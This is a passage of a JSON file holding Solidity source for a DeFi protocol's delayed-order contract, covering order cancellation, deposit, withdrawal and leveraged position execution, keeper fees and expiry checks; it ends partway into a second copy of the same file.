            account: account,\n                amount: stableWithdraw.withdrawAmount\n            });\n        } else if (order.orderType == FlatcoinStructs.OrderType.LeverageOpen) {\n            FlatcoinStructs.AnnouncedLeverageOpen memory leverageOpen = abi.decode(\n                order.orderData,\n                (FlatcoinStructs.AnnouncedLeverageOpen)\n            );\n\n            // Send collateral back to trader\n            vault.collateral().safeTransfer({\n                to: account,\n                value: order.keeperFee + leverageOpen.margin + leverageOpen.tradeFee\n            });\n        } else if (order.orderType == FlatcoinStructs.OrderType.LeverageClose) {\n            FlatcoinStructs.AnnouncedLeverageClose memory leverageClose = abi.decode(\n                order.orderData,\n                (FlatcoinStructs.AnnouncedLeverageClose)\n            );\n\n            // Unlock the ERC721 position NFT to allow for transfers.\n            ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).unlock(leverageClose.tokenId);\n        } else if (order.orderType == FlatcoinStructs.OrderType.LeverageAdjust) {\n            FlatcoinStructs.AnnouncedLeverageAdjust memory leverageAdjust = abi.decode(\n                order.orderData,\n                (FlatcoinStructs.AnnouncedLeverageAdjust)\n            );\n\n            if (leverageAdjust.marginAdjustment > 0) {\n                vault.collateral().safeTransfer({\n                    to: account,\n                    value: uint256(leverageAdjust.marginAdjustment) + leverageAdjust.totalFee\n                });\n            }\n\n            // Unlock the ERC721 position NFT to allow for transfers.\n            ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).unlock(\n                leverageAdjust.tokenId\n            );\n        }\n\n        emit FlatcoinEvents.OrderCancelled({account: account, orderType: order.orderType});\n    }\n\n    /////////////////////////////////////////////\n    //       Internal Execution Functions      //\n    /////////////////////////////////////////////\n\n    /// @notice User delayed deposit into the stable LP. Mints ERC20 token receipt.\n    /// @dev Uses the Pyth network price to execute.\n    /// @param account The user account which has a pending deposit.\n    /// @return liquidityMinted The amount of stable LP tokens the user receives.\n    function _executeStableDeposit(address account) internal returns (uint256 liquidityMinted) {\n        FlatcoinStructs.Order memory order = _announcedOrder[account];\n\n        FlatcoinStructs.AnnouncedStableDeposit memory stableDeposit = abi.decode(\n            order.orderData,\n            (FlatcoinStructs.AnnouncedStableDeposit)\n        );\n\n        vault.checkCollateralCap(stableDeposit.depositAmount);\n\n        _prepareExecutionOrder(account, order.executableAtTime);\n\n        liquidityMinted = IStableModule(vault.moduleAddress(FlatcoinModuleKeys._STABLE_MODULE_KEY)).executeDeposit(\n            account,\n            order.executableAtTime,\n            stableDeposit\n        );\n\n        // Settle the collateral\n        vault.collateral().safeTransfer({to: msg.sender, value: order.keeperFee}); // pay the keeper their fee\n        vault.collateral().safeTransfer({to: address(vault), value: stableDeposit.depositAmount}); // transfer collateral to the vault\n\n        emit FlatcoinEvents.OrderExecuted({account: account, orderType: order.orderType, keeperFee: order.keeperFee});\n    }\n\n    /// @notice User delayed withdrawal from the stable LP.\n    /// @dev Uses the Pyth network price to execute.\n    /// @param account The user account which has a pending withdrawal.\n    /// @return amountOut The amount of collateral asset tokens the user receives.\n    function _executeStableWithdraw(address account) internal returns (uint256 amountOut) {\n        FlatcoinStructs.Order memory order = _announcedOrder[account];\n\n        _prepareExecutionOrder(account, order.executableAtTime);\n\n        FlatcoinStructs.AnnouncedStableWithdraw memory stableWithdraw = abi.decode(\n            order.orderData,\n            (FlatcoinStructs.AnnouncedStableWithdraw)\n        );\n\n        uint256 withdrawFee;\n\n        (amountOut, withdrawFee) = IStableModule(vault.moduleAddress(FlatcoinModuleKeys._STABLE_MODULE_KEY))\n            .executeWithdraw(account, order.executableAtTime, stableWithdraw);\n\n        uint256 totalFee = order.keeperFee + withdrawFee;\n\n        // Make sure there is enough margin in the position to pay the keeper fee and withdrawal fee\n        if (amountOut < totalFee) revert FlatcoinErrors.NotEnoughMarginForFees(int256(amountOut), totalFee);\n\n        // include the fees here to check for slippage\n        amountOut -= totalFee;\n\n        if (amountOut < stableWithdraw.minAmountOut)\n            revert FlatcoinErrors.HighSlippage(amountOut, stableWithdraw.minAmountOut);\n\n        // Settle the collateral\n        vault.updateStableCollateralTotal(int256(withdrawFee)); // pay the withdrawal fee to stable LPs\n        vault.sendCollateral({to: msg.sender, amount: order.keeperFee}); // pay the keeper their fee\n        vault.sendCollateral({to: account, amount: amountOut}); // transfer remaining amount to the trader\n\n        emit FlatcoinEvents.OrderExecuted({account: account, orderType: order.orderType, keeperFee: order.keeperFee});\n    }\n\n    /// @notice Execution of user delayed leverage open order. Mints ERC721 token receipt.\n    /// @dev Uses the Pyth network price to execute.\n    /// @param account The user account which has a pending order.\n    /// @return tokenId The ERC721 token ID of the position.\n    function _executeLeverageOpen(address account) internal returns (uint256 tokenId) {\n        FlatcoinStructs.Order memory order = _announcedOrder[account];\n        FlatcoinStructs.AnnouncedLeverageOpen memory announcedOpen = abi.decode(\n            order.orderData,\n            (FlatcoinStructs.AnnouncedLeverageOpen)\n        );\n\n        _prepareExecutionOrder(account, order.executableAtTime);\n\n        vault.collateral().safeTransfer({\n            to: address(vault),\n            value: announcedOpen.margin + announcedOpen.tradeFee + order.keeperFee\n        }); // transfer collateral + fees to the vault\n\n        tokenId = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).executeOpen({\n            account: account,\n            keeper: msg.sender,\n            order: order\n        });\n\n        emit FlatcoinEvents.OrderExecuted({account: account, orderType: order.orderType, keeperFee: order.keeperFee});\n    }\n\n    /// @notice Execution of user delayed leverage adjust order.\n    /// @dev Uses the Pyth network price to execute.\n    /// @param account The user account which has a pending order.\n    function _executeLeverageAdjust(address account) internal {\n        FlatcoinStructs.Order memory order = _announcedOrder[account];\n        FlatcoinStructs.AnnouncedLeverageAdjust memory leverageAdjust = abi.decode(\n            order.orderData,\n            (FlatcoinStructs.AnnouncedLeverageAdjust)\n        );\n\n        _prepareExecutionOrder(account, order.executableAtTime);\n\n        ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).executeAdjust({\n            account: account,\n            keeper: msg.sender,\n            order: order\n        });\n\n        if (leverageAdjust.marginAdjustment > 0) {\n            // Sending positive margin adjustment and fees from delayed order contract to the vault\n            vault.collateral().safeTransfer({\n                to: address(vault),\n                value: uint256(leverageAdjust.marginAdjustment) + leverageAdjust.tradeFee + order.keeperFee\n            });\n        }\n\n        emit FlatcoinEvents.OrderExecuted({account: account, orderType: order.orderType, keeperFee: order.keeperFee});\n    }\n\n    /// @notice Execution of user delayed leverage close order. Burns ERC721 token receipt.\n    /// @dev Uses the Pyth network price to execute.\n    /// @param account The user account which has a pending order.\n    /// @return settledMargin The amount of margin settled from the position.\n    function _executeLeverageClose(address account) internal returns (int256 settledMargin) {\n        FlatcoinStructs.Order memory order = _announcedOrder[account];\n\n        _prepareExecutionOrder(account, order.executableAtTime);\n\n        settledMargin = ILeverageModule(vault.moduleAddress(FlatcoinModuleKeys._LEVERAGE_MODULE_KEY)).executeClose({\n            account: account,\n            keeper: msg.sender,\n            order: order\n        });\n\n        emit FlatcoinEvents.OrderExecuted({account: account, orderType: order.orderType, keeperFee: order.keeperFee});\n    }\n\n    /// @dev This function HAS to be called as soon as the transaction flow enters an announce function.\n    function _prepareAnnouncementOrder(uint256 keeperFee) internal returns (uint64 executableAtTime) {\n        // Settle funding fees to not encounter the `MaxSkewReached` error.\n        // This error could happen if the funding fees are not settled for a long time and the market is skewed long\n        // for a long time.\n        vault.settleFundingFees();\n\n        if (keeperFee < IKeeperFee(vault.moduleAddress(FlatcoinModuleKeys._KEEPER_FEE_MODULE_KEY)).getKeeperFee())\n            revert FlatcoinErrors.InvalidFee(keeperFee);\n\n        // If the user has an existing pending order that expired, then cancel it.\n        cancelExistingOrder(msg.sender);\n\n        executableAtTime = uint64(block.timestamp + vault.minExecutabilityAge());\n    }\n\n    /// @dev This function HAS to be called as soon as the transaction flow enters an execute function.\n    function _prepareExecutionOrder(address account, uint256 executableAtTime) internal {\n        if (block.timestamp > executableAtTime + vault.maxExecutabilityAge()) revert FlatcoinErrors.OrderHasExpired();\n\n        // Check that the minimum time delay is reached before execution\n        if (block.timestamp < executableAtTime) revert FlatcoinErrors.ExecutableTimeNotReached(executableAtTime);\n\n        // Delete the order tracker from storage.\n        delete _announcedOrder[account];\n    }\n\n    /////////////////////////////////////////////\n    //             View Functions              //\n    /////////////////////////////////////////////\n\n    /// @notice Getter for the announced order of an account\n    /// @param account The user account which has a pending order\n    /// @return order The order struct\n    function getAnnouncedOrder(address account) external view returns (FlatcoinStructs.Order memory order) {\n        return _announcedOrder[account];\n    }\n\n    /// @notice Checks whether a user announced order has expired executability time or not\n    /// @param account The user account which has a pending order\n    /// @return expired True if the order has expired, false otherwise\n    function hasOrderExpired(address account) public view returns (bool expired) {\n        uint256 executableAtTime = _announcedOrder[account].executableAtTime;\n\n        if (executableAtTime <= 0) revert FlatcoinErrors.ZeroValue(\"executableAtTime\");\n\n        expired = (executableAtTime + vault.maxExecutabilityAge() >= block.timestamp) ? false : true;\n    }\n}"
    },
    {
      "filename": "flatcoin-v1/src/DelayedOrder.sol",
      "content": "// SPDX-License-Identifier: SEE LICENSE IN LICENSE\npragma solidity 0.8.18;\n\nimport {SafeERC20Upgradeable} from \"openzeppelin-contracts-upgradeable/contracts/token/ERC20/utils/SafeERC20Upgradeable.sol\";\nimport {ReentrancyGuardUpgradeable} from \"openzeppelin-contracts-upgradeabl"
    }
  ]
}